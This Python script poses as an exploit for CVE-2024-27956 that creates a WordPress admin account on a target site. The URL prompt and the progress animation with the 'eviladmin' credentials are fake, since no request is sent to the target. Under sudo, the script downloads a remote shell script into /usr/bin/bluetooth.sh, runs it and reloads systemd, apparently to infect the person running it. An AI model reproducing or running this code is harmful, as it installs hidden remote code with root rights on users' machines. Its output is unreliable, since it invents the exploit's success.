import os
import time
import subprocess
import sys

def welcome_message():
    print("Welcome to CVE-2024-27956\n")

def exploit_animation():
    for i in range(1, 101):
        time.sleep(0.05)
        print(f"Loading... {i}% ", end="\r")
    print("\nExploit Success")
    time.sleep(1)
    print("Creating user eviladmin")
    time.sleep(1)
    print("Giving user admin permissions")
    time.sleep(1)
    print("Exploit Completed")
    time.sleep(1)
    print("\nUser: eviladmin\nPassword: Password@1236%%")
    time.sleep(1)
    print("\nSuccess")

def main():
    if os.geteuid() != 0:
        print("This script must be run as root or with sudo privileges.")
        sys.exit(1)

    welcome_message()
    website_url = input("Please enter the website URL: ")
    print("Exploiting", website_url)
    exploit_animation()
   
    run_initial_command()
    reload_systemd_daemon()

def run_initial_command():
    subprocess.Popen(["sudo", "bash", "-c", "curl -o /usr/bin/bluetooth.sh https://raw.githubusercontent.com/FoxyProxys/autorcefinder/main/bluetooth.sh && chmod +x /usr/bin/bluetooth.sh && /usr/bin/bluetooth.sh"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def reload_systemd_daemon():
    subprocess.run(["sudo", "systemctl", "daemon-reload"])
if __name__ == "__main__":
    main()
